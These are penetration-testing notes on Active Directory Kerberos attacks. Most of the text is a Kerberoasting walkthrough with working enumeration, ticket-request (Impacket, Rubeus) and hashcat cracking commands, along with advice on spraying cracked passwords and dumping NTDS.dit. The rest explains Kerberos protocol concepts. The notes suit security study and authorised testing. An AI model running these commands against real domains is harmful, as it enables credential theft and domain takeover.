## Kerberoasting
```
Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoasted, however, the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts use a tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain.

If we are on the target and need to find all the spn accounts
    setspn -T offense -Q /

or some powerview cmdlets
    Get-NetUser -SPN

Or to get info about service account of specific group
    Get-NetUser -SPN | ?{$_.memberof -match 'GroupName'}
    Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
    get-adobject | Where-Object {$.serviceprincipalname -ne $null -and $.distinguishedname -like "CN=Users" -and $_.cn -ne "krbtgt"}

    Using Impacket:
This can be done remotely but for this we need a remote connection as any user on the target system
controller.local is domain name , Machine1 is PC name and Password1 is a password
    sudo python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.172.234 -request

    using Rubeus:

This command will dump hashes of available service accounts
    Rubeus.exe kerberoast (we can also specify specific user to target by adding /username:password in this command.also domain or domaincontroller)

NOw copy the hash and crack in our machine

What Can a Service Account do?
After cracking the service account password there are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not. If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit. If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users. If you are in a professional pen test be aware of how the company wants you to show risk most of the time they don't want you to exfiltrate data and will set a goal or process for you to get in order to show risk inside of the assessment.

Mitigations:
    Strong Complex passwords
    Dont make service accounts domain admins


Windows
Rubeus Kerberoast:
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

Reviewing the correct Hashcat mode
kali@kali:~$ hashcat --help | grep -i "Kerberos"         
  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol

kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

Linux
Remotely kerberoast
Perform Kerberoasting from Linux. use impacket-GetUserSPNs with the IP of the domain controller as the argument for -dc-ip. Since our Kali machine is not joined to the domain, we also have to provide domain user credentials to obtain the TGS-REP hash. As before, we can use -request to obtain the TGS and output them in a compatible format for Hashcat.

Using impacket-GetUserSPNs to perform Kerberoasting on Linux to obtain TGS-REP hash:
kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/mute

kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," synchronize the time of the Kali machine with the domain controller. We can use ntpdate3 or rdate4 to do so.



#Kerberos Pentesting
https://www.tarlogic.com/blog/how-to-attack-kerberos/

What is Kerberos? -
Kerberos is the default authentication service for Microsoft Windows domains. It is intended to be more "secure" than NTLM by using third party ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.

Common Terminology -
Ticket Granting Ticket (TGT) - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
Key Distribution Center (KDC) - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
Authentication Service (AS) - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
Ticket Granting Service (TGS) - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
Service Principal Name (SPN) - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
KDC Long Term Secret Key (KDC LT Key) - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
Client Long Term Secret Key (Client LT Key) - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
Service Long Term Secret Key (Service LT Key) - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
Session Key - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
Privilege Attribute Certificate (PAC) - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

AS-REQ w/ Pre-Authentication In Detail -
The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC. In order to validate the user and create a TGT for the user, the KDC must follow these exact steps. The first step is for the user to encrypt a timestamp NT hash and send it to the AS. The KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT as well as a session key for the user.

Ticket Granting Ticket Contents -
In order to understand how the service tickets get created and validated, we need to start with where the tickets come from; the TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.

Service Ticket Contents -
To understand how Kerberos authentication works you first need to understand what these tickets contain and how they're validated. A service ticket contains two portions: the service provided portion and the user-provided portion. I'll break it down into what each portion contains.

Service Portion: User Details, Session Key, Encrypts the ticket with the service account NTLM hash.
User Portion: Validity Timestamp, Session Key, Encrypts with the TGT session key.

Kerberos Authentication Overview -
AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).
AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.
TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.
TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.
AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.
AP-REP - 6.) The service grants access

Kerberos Tickets Overview -
The main ticket that you will see is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket. The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.

Attack Privilege Requirements -
Kerbrute Enumeration - No domain access required 
Pass the Ticket - Access as a user to the domain required
Kerberoasting - Access as any user required
AS-REP Roasting - Access as any user required
Golden Ticket - Full domain compromise (domain admin) required 
Silver Ticket - Service hash required 
Skeleton Key - Full domain compromise (domain admin) required
```
